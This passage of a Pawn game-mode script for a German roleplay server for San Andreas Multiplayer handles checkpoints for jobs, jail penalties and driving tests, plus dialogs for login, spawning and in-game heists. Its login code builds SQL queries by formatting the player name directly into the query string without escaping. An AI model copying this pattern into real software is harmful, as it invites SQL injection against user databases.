		SetPlayerCheckpoint(playerid,8944.1328,-9593.5938,2.2312,2);
	}
	else if(SpielerInfo[playerid][uStrafCP] == 1)
	{
		DisablePlayerCheckpoint(playerid);
		SpielerInfo[playerid][uStrafCP] = 2;
		SetPlayerCheckpoint(playerid,8987.4326,-9592.2051,2.2312,2);
	}
	else if(SpielerInfo[playerid][uStrafCP] == 2)
	{
		DisablePlayerCheckpoint(playerid);
		SpielerInfo[playerid][uStrafCP] = 3;
		SetPlayerCheckpoint(playerid,8988.1240,-9548.5781,2.2312,2);
	}
	else if(SpielerInfo[playerid][uStrafCP] == 3)
	{
		DisablePlayerCheckpoint(playerid);
		SpielerInfo[playerid][uStrafe]--;
		SetPlayerCheckpoint(playerid,8943.4570,-9548.5664,2.2312,2);
		SpielerInfo[playerid][uStrafCP] = 0;
		if(SpielerInfo[playerid][uStrafe] == 0)
		{
      		DisablePlayerCheckpoint(playerid);
		    SpielerInfo[playerid][uStrafCP] = -1;
		    SpielerInfo[playerid][uStrafe] = -1;
      		Teleport(playerid,1826.9099,-9344.4756,4.4203);
	        SendClientMessage(playerid,COLOR_GREEN,"Du wurdest entlassen. Benimm dich in Zukunft!");
	        Freeze(playerid); SetTimerEx("Unfreeze",3000,0,"d",playerid);
		}
	}
	if(PlayerKoks[playerid] > 0)
	{
	    DisablePlayerCheckpoint(playerid);
		SendFormatMessage(playerid,COLOR_WHITE,"Manuel: Hier kriegst du deine %dg Koks, nun zieh Leine!",PlayerKoks[playerid]);
		Verstauen(playerid,1575,PlayerKoks[playerid]);
		PlayerKoks[playerid] = 0;
	}
	if(TruckSpritmodus[playerid] == 1)
	{
	    DisablePlayerCheckpoint(playerid);
	    TogglePlayerControllable(playerid,false);
	    ShowPlayerDialog(playerid,DIALOG_TRUCKEROEL,DIALOG_STYLE_MSGBOX,"Trucker","Laufe zur Abpumpmaschine und drücke am Checkpoint die Taste 'H'","OK","OK");
	}
	else if(TruckSpritmodus[playerid] == 12)
	{
	    TruckSpritmodus[playerid] = 13;
	    DisablePlayerCheckpoint(playerid);
	    SendClientMessage(playerid,COLOR_GREEN,"Dein Öl wird nun in einen Behälter gepumpt.");
	    Abpumpen[playerid] = SetTimerEx("Abpumpentimerzwei", 2000, true, "i", playerid);
	    TogglePlayerControllable(playerid,false);
	}
	else if(TruckSpritmodus[playerid] == 22)
	{
	    TruckSpritmodus[playerid] = 23;
	    DisablePlayerCheckpoint(playerid);
	    SendClientMessage(playerid,COLOR_GREEN,"Dir wird nun das verarbeitete Öl (Sprit) in den Tank gepumpt.");
	    Abpumpen[playerid] = SetTimerEx("Abpumpentimerdrei", 2000, true, "i", playerid);
	    TogglePlayerControllable(playerid,false);
	}
	else if(TruckSpritmodus[playerid] == 32)
	{
	    TogglePlayerControllable(playerid,false);
	    new Float:X,Float:Y,Float:Z,Geschwindigkeit;
		GetVehicleVelocity(GetPlayerVehicleID(playerid),X,Y,Z);
		Geschwindigkeit = floatround(floatsqroot(X*X + Y*Y + Z*Z) * 95 * 2);
		SetVehicleVelocity(GetPlayerVehicleID(playerid),X/Geschwindigkeit*0,Y/Geschwindigkeit*0,Z/Geschwindigkeit*0);
	    TruckSpritmodus[playerid] = 33;
	    DisablePlayerCheckpoint(playerid);
	    SendClientMessage(playerid,COLOR_GREEN,"Warte auf ein Zeichen vom Ölwart, danach bekommst du eine Tankstelle zugewiesen.");
	    SetTimerEx("tankwart", 5000, false, "i", playerid);
	    SetTimerEx("koordinaten", 7000, false, "i", playerid);
	    SetPlayerCameraPos(playerid, 2676.9785,-8794.2012,6.3759);
	    SetPlayerCameraLookAt(playerid, 2668.3201,-8788.0537,5.9976);
	}
	if(PlayerTruckmodus[playerid] == 1)
	{
	    PlayerTruckmodus[playerid] = 2;
	    SetPlayerCheckpoint(playerid,3362.6692,-8589.4004,4.3878-1,4);
	    RemovePlayerFromVehicle(playerid);
	    SendClientMessage(playerid,COLOR_GREEN,"Hole am Checkpoints Kartons ab und belade deinen Truck hinten am Rolltor.");
 	}
	else if(PlayerTruckmodus[playerid] == 2)
	{
	    PlayerTruckmodus[playerid] = 2;
	    DisablePlayerCheckpoint(playerid);
	    SendClientMessage(playerid,COLOR_GREEN,"Benutze 'H' um Produkte zu bekommen!");
 	}
	else if(PlayerTruckmodus[playerid] == 3)
	{
	    vehicleprodukte[GetPlayerVehicleID(playerid)] -= 25;
	    DisablePlayerCheckpoint(playerid);
	    SendClientMessage(playerid,COLOR_GREEN,"Gebe die Produkte dem Verkäufer!");
	    RemovePlayerFromVehicle(playerid);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_CARRY);
 		SetPlayerAttachedObject(playerid, 9, 1221, 5, 0.302, 0.378, 0.071, -65.299, 0.000, 0.899);
 	}
	else if(PlayerTruckmodus[playerid] == 4)
	{
	    vehicleprodukte[GetPlayerVehicleID(playerid)] -= 25;
	    DisablePlayerCheckpoint(playerid);
	    SendClientMessage(playerid,COLOR_GREEN,"Gebe die Produkte dem Verkäufer!");
	    RemovePlayerFromVehicle(playerid);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_CARRY);
 		SetPlayerAttachedObject(playerid, 9, 1221, 5, 0.302, 0.378, 0.071, -65.299, 0.000, 0.899);
 	}
	else if(PlayerTruckmodus[playerid] == 5)
	{
	    vehicleprodukte[GetPlayerVehicleID(playerid)] -= 25;
	    DisablePlayerCheckpoint(playerid);
	    SendClientMessage(playerid,COLOR_GREEN,"Gebe die Produkte dem Verkäufer!");
	    RemovePlayerFromVehicle(playerid);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_CARRY);
 		SetPlayerAttachedObject(playerid, 9, 1221, 5, 0.302, 0.378, 0.071, -65.299, 0.000, 0.899);
 	}
	else if(PlayerTruckmodus[playerid] == 6)
	{
	    vehicleprodukte[GetPlayerVehicleID(playerid)] -= 25;
	    DisablePlayerCheckpoint(playerid);
	    SendClientMessage(playerid,COLOR_GREEN,"Gebe die Produkte dem Verkäufer!");
	    RemovePlayerFromVehicle(playerid);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_CARRY);
 		SetPlayerAttachedObject(playerid, 9, 1221, 5, 0.302, 0.378, 0.071, -65.299, 0.000, 0.899);
 	}
	else if(PlayerTruckmodus[playerid] == 7)
	{
		PlayerTrucker[playerid] = 0;
		PlayerTruckmodus[playerid] = 0;
		playervehiclemerk[playerid] = -1;
	    vehicleprodukte[GetPlayerVehicleID(playerid)] = 0;
	    DisablePlayerCheckpoint(playerid);
	    SendClientMessage(playerid,COLOR_GREEN,"Danke das du gefahren bist! Hier kriegst du noch 120$!");
	    GebeGeld(playerid,120);
	    RemovePlayerFromVehicle(playerid);
 	}



    if(cpaktiv[playerid] == 1)
    {
        cpaktiv[playerid] = 0;
        SendClientMessage(playerid,COLOR_GREEN,"Du hast dein Ziel erreicht!");
    	DisablePlayerCheckpoint(playerid);
	}
	if(Fahrschulcp[playerid] == 1)
	{
	    DisablePlayerCheckpoint(playerid);
	    RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~g~LINKS ABBIEGEN",2000,3);
	    SetPlayerCheckpoint(playerid,1650.1019,-8522.2676,3.6292-1,3.0);
	    Fahrschulcp[playerid] = 2;
	}
	else if(Fahrschulcp[playerid] == 2)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~g~RECHTS ABBIEGEN",2000,3);
	    SetPlayerCheckpoint(playerid,1656.5596,-8696.2666,3.7755-1,3.0);
	    Fahrschulcp[playerid] = 3;
	}
	else if(Fahrschulcp[playerid] == 3)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~r~STOPSCHILD BEACHTEN\n~g~RECHTS ABBIEGEN",2000,3);
	    SetPlayerCheckpoint(playerid,1584.6920,-8721.7900,5.9584-1,3.0);
	    Fahrschulcp[playerid] = 4;
	}
	else if(Fahrschulcp[playerid] == 4)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~r~STOPSCHILD BEACHTEN\n~g~GERADEAUS",2000,3);
	    SetPlayerCheckpoint(playerid,1586.5955,-8880.5332,5.9620-1,3.0);
	    Fahrschulcp[playerid] = 5;
	}
	else if(Fahrschulcp[playerid] == 5)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~g~LINKS ABBIEGEN",2000,3);
	    SetPlayerCheckpoint(playerid,1760.7081,-8881.7881,3.7944-1,3.0);
	    Fahrschulcp[playerid] = 6;
	}
	else if(Fahrschulcp[playerid] == 6)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~r~AMPEL BEACHTEN\n~g~RECHTS ABBIEGEN",2000,3);
	    SetPlayerCheckpoint(playerid,1788.3893,-9075.1055,3.7837-1,3.0);
	    Fahrschulcp[playerid] = 7;
	}
	else if(Fahrschulcp[playerid] == 7)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~g~GERADEAUS",2000,3);
	    SetPlayerCheckpoint(playerid,1792.9082,-9277.3867,3.7891-1,3.0);
	    Fahrschulcp[playerid] = 8;
	}
	else if(Fahrschulcp[playerid] == 8)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~r~AMPEL BEACHTEN\n~g~LINKS ABBIEGEN",2000,3);
	    SetPlayerCheckpoint(playerid,1888.8254,-9302.0176,3.7983-1,3.0);
	    Fahrschulcp[playerid] = 9;
	}
	else if(Fahrschulcp[playerid] == 9)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~r~SPEEDLIMIT BEACHTEN\n~g~GERADEAUS",2000,3);
	    SetPlayerCheckpoint(playerid,4317.5449,-9300.4414,3.7907-1,3.0);
	    Fahrschulcp[playerid] = 10;
	}
	else if(Fahrschulcp[playerid] == 10)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~g~GERADEAUS",2000,3);
	    SetPlayerCheckpoint(playerid,6302.8115,-9301.1367,3.7925-1,3.0);
	    Fahrschulcp[playerid] = 11;
	}
	else if(Fahrschulcp[playerid] == 11)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~r~AMPEL BEACHTEN\n~g~LINKS ABBIEGEN",2000,3);
	    SetPlayerCheckpoint(playerid,6337.4795,-8953.8574,3.7764-1,3.0);
	    Fahrschulcp[playerid] = 12;
	}
	else if(Fahrschulcp[playerid] == 12)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~r~ACHTUNG BRÜCKE\n~g~GERADEAUS",2000,3);
	    SetPlayerCheckpoint(playerid,6337.3701,-7903.8696,3.7774-1,3.0);
	    Fahrschulcp[playerid] = 13;
	}
	else if(Fahrschulcp[playerid] == 13)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~r~AMPEL BEACHTEN\n~g~LINKS ABBIEGEN",2000,3);
	    SetPlayerCheckpoint(playerid,6227.1157,-7849.0708,4.2167-1,3.0);
	    Fahrschulcp[playerid] = 14;
	}
	else if(Fahrschulcp[playerid] == 14)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~r~KEIN SPEEDLIMIT ~g~GERADEAUS",2000,3);
	    SetPlayerCheckpoint(playerid,4430.3779,-7834.5166,3.7917-1,3.0);
	    Fahrschulcp[playerid] = 15;
	}
	else if(Fahrschulcp[playerid] == 15)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~r~AMPEL BEACHTEN ~g~GERADEAUS",2000,3);
	    SetPlayerCheckpoint(playerid,1794.5258,-7834.6836,3.7865-1,3.0);
	    Fahrschulcp[playerid] = 16;
	}
	else if(Fahrschulcp[playerid] == 16)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~g~LINKS ABBIEGEN",2000,3);
	    SetPlayerCheckpoint(playerid,1726.0250,-7870.9497,3.7971-1,3.0);
	    Fahrschulcp[playerid] = 17;
	}
	else if(Fahrschulcp[playerid] == 17)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~g~KURVE FOLGEN",2000,3);
	    SetPlayerCheckpoint(playerid,1657.7537,-8428.3496,3.7908-1,3.0);
	    Fahrschulcp[playerid] = 18;
	}
	else if(Fahrschulcp[playerid] == 18)
	{
	    DisablePlayerCheckpoint(playerid);RepairVehicle(GetPlayerVehicleID(playerid));
	    GameTextForPlayer(playerid,"~g~RECHTS ABBIEGEN",2000,3);
	    SetPlayerCheckpoint(playerid,1631.4764,-8436.7939,1.6899-1,3.0);
	    Fahrschulcp[playerid] = 19;
	}
	else if(Fahrschulcp[playerid] == 19)
	{
	    DisablePlayerCheckpoint(playerid);
	    GameTextForPlayer(playerid,"~g~BESTANDEN!!!",2000,3);
	    Fahrschulcp[playerid] = 0;
	    RemovePlayerFromVehicle(playerid);
		if(Fahrstunde[playerid] == 1)
		{
		    GebeGeld(playerid,-200);
		    BizInfo[5][bkasse] += 200.0; Geschaftspeichern(5);
		    SpielerInfo[playerid][uFuehrerschein] = 1;
		    Fahrstunde[playerid] = 0;
		    SendClientMessage(playerid,COLOR_GREEN,"Herzlichen Glückwunsch! Du hast den Autoführerschein bestanden!");
		    if(SpielerInfo[playerid][ufFuhrerschein] == 0)
            {
            	SpielerInfo[playerid][ufFuhrerschein] = 1;
            	Missionenaktu(playerid);
            	SendClientMessage(playerid,COLOR_RED,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Führerschein {0080FF}(/missionen)");
            	new Float:belohnung;
            	belohnung = 600;
            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
				GebeGeld(playerid,belohnung);
			}
		}
		else if(Fahrstunde[playerid] == 2)
		{
		    GebeGeld(playerid,-400);
		    BizInfo[5][bkasse] += 400.0; Geschaftspeichern(5);
		    SpielerInfo[playerid][uMotorradschein] = 1;
		    Fahrstunde[playerid] = 0;
		    SendClientMessage(playerid,COLOR_GREEN,"Herzlichen Glückwunsch! Du hast den Motorradführerschein bestanden!");
		}
		else if(Fahrstunde[playerid] == 3)
		{
		    GebeGeld(playerid,-600);
		    BizInfo[5][bkasse] += 600.0; Geschaftspeichern(5);
		    SpielerInfo[playerid][uLKWschein] = 1;
		    Fahrstunde[playerid] = 0;
		    SendClientMessage(playerid,COLOR_GREEN,"Herzlichen Glückwunsch! Du hast den LKW-Führerschein bestanden!");
		}
	}
    return 1;
}
public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
    return 1;
}
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    if(SpielerInfo[playerid][uAFK] != 300) SpielerInfo[playerid][uAFK] = 0;
	new string[300];
	if(dialogid == Login)
	{
        if(!strlen(inputtext)) return ShowPlayerDialog(playerid,Login,DIALOG_STYLE_PASSWORD,"Login","Gebe hier dein Passwort ein:","Einloggen","");
 		new dbsalt[41],passwort[50];
		format(string,sizeof(string),"SELECT Passwort,salt FROM login WHERE Name='%s' LIMIT 1",PlayerName(playerid));
		mysql_query(dbhandle, string, true);
		printf("%s",string);
		cache_get_field_content(0, "Passwort",passwort);
		cache_get_field_content(0, "salt",dbsalt);
		if(strcmp(verschluesseln(inputtext,dbsalt),passwort,false) == 0)
		{
 			format(string,sizeof string,"userID='%d'",SpielerInfo[playerid][uID]);
			/*new string2[5];
			format(string2,5,"%d",on);
			mysqlupdate("user",string,"eingeloggt",string2);*/
		    ladgangicon(playerid);
		    for(new x = 0; x < sizeof(LoginDraw); x++) TextDrawHideForPlayer(playerid,LoginDraw[x]);
			SendClientMessage(playerid,COLOR_GREEN,"Erfolgreich eingeloggt! - Einen Moment bitte deine Daten werden geladen...");
			SetPlayerVirtualWorld(playerid,0);
			CancelSelectTextDraw(playerid);
			AccountLaden(playerid);
			format(string,sizeof string,"UPDATE `user` SET eingeloggt='1' WHERE userID='%d'",SpielerInfo[playerid][uID]);
			mysql_query(dbhandle, string);
			if(SpielerInfo[playerid][uVerstrahlt] == 1)
			{
			    TextDrawShowForPlayer(playerid, atomtext[0]);
				TextDrawShowForPlayer(playerid, atomtext[1]);
				TextDrawShowForPlayer(playerid, atomtext[2]);
			}
			else
			{
			    TextDrawHideForPlayer(playerid, atomtext[0]);
				TextDrawHideForPlayer(playerid, atomtext[1]);
				TextDrawHideForPlayer(playerid, atomtext[2]);
			}
			for(new i=0; i<GetMaxPlayers(); i++)
			{
			    if(SpielerInfo[i][uEingeloggt] == 1)
			    {
					UserWerbenUser(i);
				}
			}
			if(SpielerInfo[playerid][uMissionen] == 1 || SpielerInfo[playerid][uLevel] == 1 || SpielerInfo[playerid][uLevel] == 2 || SpielerInfo[playerid][uLevel] == 3)
			{
				for(new i = 0; i < 30; i++)
			    {
			    	PlayerTextDrawShow(playerid,Missionen[playerid][i]);
			    	SpielerInfo[playerid][uMissionen] = 1;
			    	Missionenaktu(playerid);
				}
			}
			StopAudioStreamForPlayer(playerid);
			SpielerInfo[playerid][uEingeloggt] = 1;
			PlayerSpawnOnPoint(playerid);
			Streamer_ToggleIdleUpdate(playerid, false);
			TextDrawShowForPlayer(playerid,GeldAnzeige[0]);
			TextDrawShowForPlayer(playerid,GeldAnzeige[1]);
			TextDrawShowForPlayer(playerid,GeldAnzeige[2]);
			PlayerTextDrawShow(playerid,GeldAnzeigewert[playerid]);
			printf("7");
			if(sperrzone == 1)
			{
				GangZoneShowForPlayer(playerid,sperrzonef, 0xE10000AA);
		 		GangZoneFlashForPlayer(playerid,sperrzonef,0x0069FFAA);
		 		SendClientMessage(playerid,COLOR_RED,"ACHTUNG: Es gibt eine Sperrzone, diese darf von Zivilisten nicht betreten werden!");
			}
			for(new x = 0; x < sizeof(UserBr); x++)
			{
				TextDrawShowForPlayer(playerid,UserBr[x]);
				PlayerTextDrawShow(playerid,Orttext[playerid]);
			}
			printf("8");
			if(SpielerInfo[playerid][uStrafe] > 0)
			{
				if(SpielerInfo[playerid][uStrafCP] == 0)
				{
					DisablePlayerCheckpoint(playerid);
					SpielerInfo[playerid][uStrafCP] = 1;
					SetPlayerCheckpoint(playerid,8944.1328,-9593.5938,2.2312,2);
				}
				else if(SpielerInfo[playerid][uStrafCP] == 1)
				{
					DisablePlayerCheckpoint(playerid);
					SpielerInfo[playerid][uStrafCP] = 2;
					SetPlayerCheckpoint(playerid,8987.4326,-9592.2051,2.2312,2);
				}
				else if(SpielerInfo[playerid][uStrafCP] == 2)
				{
					DisablePlayerCheckpoint(playerid);
					SpielerInfo[playerid][uStrafCP] = 3;
					SetPlayerCheckpoint(playerid,8988.1240,-9548.5781,2.2312,2);
				}
				else if(SpielerInfo[playerid][uStrafCP] == 3)
				{
					DisablePlayerCheckpoint(playerid);
					SpielerInfo[playerid][uStrafe]--;
					SetPlayerCheckpoint(playerid,8943.4570,-9548.5664,2.2312,2);
					SpielerInfo[playerid][uStrafCP] = 0;
					if(SpielerInfo[playerid][uStrafe] == 0)
					{
					    DisablePlayerCheckpoint(playerid);
					    SpielerInfo[playerid][uStrafCP] = -1;
					    SpielerInfo[playerid][uStrafe] = -1;
					}
				}
			}else{DisablePlayerCheckpoint(playerid); SpielerInfo[playerid][uStrafCP] = -1;SpielerInfo[playerid][uStrafe] = -1;}
			printf("9");
			if(SpielerInfo[playerid][uTutorial] == 0)
			{
			    tutorialcp[playerid] ++;
			    TUTTIMER[playerid] = SetTimerEx("tutorial", 200, 0, "i", playerid);
			}
			printf("10");
			new query[200];
			format(query, sizeof(query), "SELECT * FROM complaints_topics WHERE `from`='%i' AND status=4", SpielerInfo[playerid][uID]);
	        mysql_query(dbhandle, query, true);
			if(SpielerInfo[playerid][uBan] == 1)
			{
				new str[140];
				format(str,sizeof(str),"Dein Account ist gebannt! Melde dich unter www.county-islands.com für einen Entbannungsantrag!");
				SendClientMessage(playerid,COLOR_LIGHTRED,str);
			    SetTimerEx("KICKHIM", 200, false, "d", playerid);
			}
			//log(playerid, 1, "Hat sich eingeloggt");
			new userip[25];
		    GetPlayerIp(playerid, userip, sizeof(userip));
		    format(string, sizeof(string), "INSERT INTO usersitzungen (userid, username, userip,login) VALUES ('%i','%s','%s','%i')", SpielerInfo[playerid][uID], PlayerName(playerid), userip,gettime());
		    mysql_query(dbhandle, string);
		    printf("%s",query);
		    SpielerInfo[playerid][sitzungsid]= cache_insert_id();
		    SetPlayerVirtualWorld(playerid,0);
		    printf("%d",GetPlayerVirtualWorld(playerid));
			/*if(SpielerInfo[playerid][ustarttut] != 10)
			{
				//Anfangstut(playerid);
			    SendClientMessage(playerid,COLOR_LIGHTBLUE,"|----------- Einführung 0/3 -----------|");
			}*/

		}
		else
		{
            FalschesPasswort[playerid]++;
            if(FalschesPasswort[playerid] == 3)
            {
    			SendClientMessage(playerid,COLOR_RED,"Du wurdest gekickt weil du dein Passwort 3x falsch eingegeben hast!");
				format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: 3x Passwort falsch",PlayerName(playerid));
				SendMessageToAll(COLOR_LIGHTRED,string);
				KWBLog(PlayerName(playerid),"System","Kick","Fehlerhaftes Login");
				SetTimerEx("KICKHIM", 200, false, "d", playerid);
				FalschesPasswort[playerid] = 0;
  			}
  			else
  			{
				SendClientMessage(playerid,COLOR_RED,"Passwort Falsch!");
				ShowPlayerDialog(playerid,Login,DIALOG_STYLE_PASSWORD,"Login","Gebe hier dein Passwort ein:","Einloggen","");
  			}
		}
		printf("11");
	}
	else if(dialogid == DIALOG_SKINWAHL)
	{
	    if(response)//Zivi
	    {
	        SetPlayerSkin(playerid,SpielerInfo[playerid][uZiviSkin]);
	        SendClientMessage(playerid,COLOR_GREEN,"Du trägst nun deinen Zivilistenskin!");
	        SpielerInfo[playerid][uZiviFrak] = 0;
	    }
		else
		{
		    if(SpielerInfo[playerid][uLeiter] == 0 && SpielerInfo[playerid][uMitglied] == 0)
		    {
		        SendClientMessage(playerid,COLOR_GREEN,"Du bist in keiner Fraktion!");
		        SpielerInfo[playerid][uSkin] = 3;
		    }
		    else
		    {
				SetPlayerSkin(playerid,SpielerInfo[playerid][uSkin]);
				SendClientMessage(playerid,COLOR_GREEN,"Du trägst nun deinen Fraktionsskin!");
				SpielerInfo[playerid][uZiviFrak] = 1;
			}
		}
	}
	else if(dialogid == DIALOG_TRUCKEROEL)
	{
		if(response)
		{
		    TogglePlayerControllable(playerid,true);
			RemovePlayerFromVehicle(playerid);
			TruckSpritmodus[playerid] = 2;
	    	SetPlayerCheckpoint(playerid,2989.3435,-8750.3311,4.7994-1,2);
		}
		else
		{
			TogglePlayerControllable(playerid,true);
			RemovePlayerFromVehicle(playerid);
			TruckSpritmodus[playerid] = 2;
	    	SetPlayerCheckpoint(playerid,2989.3435,-8750.3311,4.7994-1,2);
		}
	
	}
	else if(dialogid == DIALOG_SPAWNENREG)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            SpielerInfo[playerid][uSpawn] = 0;
				SendClientMessage(playerid,COLOR_GREEN,"Du Spawnst nun an den Positionen an welchen du dich ausgeloggt hast!");
	        }
	        if(listitem == 1)
	        {
				ShowPlayerDialog(playerid,DIALOG_SPAWNENREG2,DIALOG_STYLE_LIST,"Spawn Auswahl","Lake Sorten Motel\nSanta Felton Motel","Wählen","Abbrechen");
	        }
	    }
	    else
	    {
	        ShowPlayerDialog(playerid,DIALOG_SPAWNENREG,DIALOG_STYLE_LIST,"Spawn Auswahl","Spawnen auf ausgeloggter Position\nSpawnen im LS Motel oder SF Motel","Wählen","Abbrechen");
	    }
	}
	else if(dialogid == DIALOG_SPAWNENREG2)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            SpielerInfo[playerid][uSpawn] = 1;
				SendClientMessage(playerid,COLOR_GREEN,"Du Spawnst nun am Lake Sorten Motel!");
	        }
	        if(listitem == 1)
	        {
	            SpielerInfo[playerid][uSpawn] = 2;
				SendClientMessage(playerid,COLOR_GREEN,"Du Spawnst nun am Santa Felton Motel!");
	        }
	    }
	    else
	    {
	        ShowPlayerDialog(playerid,DIALOG_SPAWNENREG,DIALOG_STYLE_LIST,"Spawn Auswahl","Spawnen auf ausgeloggter Position\nSpawnen im LS Motel oder SF Motel","Wählen","Abbrechen");
	    }
	}
	else if(dialogid == DIALOG_SPAWNEN)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            SpielerInfo[playerid][uSpawn] = 0;
				SendClientMessage(playerid,COLOR_GREEN,"Du Spawnst nun an den Positionen an welchen du dich ausgeloggt hast!");
	        }
	        if(listitem == 1)
	        {
	            if(SpielerInfo[playerid][uLeiter] == 0 && SpielerInfo[playerid][uMitglied] == 0)
	            {
					ShowPlayerDialog(playerid,DIALOG_SPAWNEN2,DIALOG_STYLE_LIST,"Spawn Auswahl","Lake Sorten Motel\nSanta Felton Motel","Wählen","Abbrechen");
				}
				else
				{
					SendClientMessage(playerid,COLOR_RED,"Diese Spawnpunkte sind nur für Zivilisten möglich!");
				}
	        }
	        if(listitem == 2)
	        {
				if(SpielerInfo[playerid][uLeiter] > 0 || SpielerInfo[playerid][uMitglied] > 0)
				{
    				SpielerInfo[playerid][uSpawn] = 4;
    				SendClientMessage(playerid,COLOR_GREEN,"Du Spawnst nun an deiner Fraktionsbase!");
				}
				else
				{
				    SendClientMessage(playerid,COLOR_RED,"Diese Spawnpunkte sind nur für Fraktionen möglich!");
				}
	        }
	        if(listitem == 3)
	        {
				if(SpielerInfo[playerid][uHausschluessel] > -1)
				{
				    SpielerInfo[playerid][uSpawn] = 3;
					SendClientMessage(playerid,COLOR_GREEN,"Du Spawnst nun in deinem Haus!");
				}
				else
				{
				    SendClientMessage(playerid,COLOR_RED,"Du besitzt kein Haus!");
				}
	        }
	    }
	}
	else if(dialogid == DIALOG_SPAWNEN2)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            SpielerInfo[playerid][uSpawn] = 1;
				SendClientMessage(playerid,COLOR_GREEN,"Du Spawnst nun am Lake Sorten Motel!");
	        }
	        if(listitem == 1)
	        {
	            SpielerInfo[playerid][uSpawn] = 2;
				SendClientMessage(playerid,COLOR_GREEN,"Du Spawnst nun am Santa Felton Motel!");
	        }
	    }
	}
	else if(dialogid == DIALOG_GELDTRANS)
	{
	    if(response)
	    {
	        SendClientMessage(playerid,COLOR_GREEN,"Gebe den Transporter auf dem Wrong Hill ab!");
	    	SetPlayerCheckpoint(playerid,4101.7832,-8569.3369,122.2250-1,5.0);
	    	FraktionsNachricht(1,COLOR_HQ,"HQ: Der Geldtransporter wurde geklaut! Holen Sie den Geldtransporter zurück!");
			FraktionsNachricht(2,COLOR_HQ,"HQ: Der Geldtransporter wurde geklaut! Holen Sie den Geldtransporter zurück!");
			FraktionsNachricht(15,COLOR_HQ,"HQ: Der Geldtransporter wurde geklaut! Holen Sie den Geldtransporter zurück!");
			geldtransporterdriver = playerid;
	    }
	    else
	    {
	        RemovePlayerFromVehicle(playerid);
	        geldtransporterdriver = -1;
	        SendClientMessage(playerid,COLOR_GREEN,"Dann halt nicht...");
	    }
	}
	else if(dialogid == DIALOG_BOOM1)
	{
	    if(listitem == 0)
		{
		    if(Musikbox[0] != playerid && Musikbox[1] != playerid && Musikbox[2] != playerid)
		    {
			    if(Musikbox[0] == -1)
			    {
			        if(!IsPlayerInRangeOfPoint(playerid,40,BoomBox[1][0],BoomBox[1][1],BoomBox[1][2]) && !IsPlayerInRangeOfPoint(playerid,40,BoomBox[2][0],BoomBox[2][1],BoomBox[2][2]))
			        {
				        Musikbox[0] = playerid;
				        ShowPlayerDialog(playerid,DIALOG_BOOM2,DIALOG_STYLE_LIST,"Musikbox","iLove Radio\n1Live\nBig FM","Anwenden","");
				        new Float:xx,Float:yy,Float:zz;
				        GetPlayerPos(playerid,xx,yy,zz);
				        BoomBox[0][0] = xx;
				        BoomBox[0][1] = yy;
				        BoomBox[0][2] = zz;
				        CallLocalFunction("cmd_bomb","d",playerid);
						Musikobject[0] = CreateDynamicObjectEx(2226,xx,yy,zz-1,0,0,0,50,50);
						for(new x = 0; x < sizeof(SpielerInventar[]); x++)
						{
					    	if(SpielerInventar[playerid][x][0] == 30)
					    	{
								new mm2 = x;
								SpielerInventar[playerid][mm2][0] = -1;
				    			SpielerInventar[playerid][mm2][1] = 0;
				       			PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
								PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
							}
						}
					}else{SendClientMessage(playerid,COLOR_RED,"Hier steht bereits eine Boombox!");}
			    }
				else if(Musikbox[1] == -1)
			    {
	   				if(!IsPlayerInRangeOfPoint(playerid,40,BoomBox[0][0],BoomBox[0][1],BoomBox[0][2]) && !IsPlayerInRangeOfPoint(playerid,40,BoomBox[2][0],BoomBox[2][1],BoomBox[2][2]))
			        {
				        Musikbox[1] = playerid;
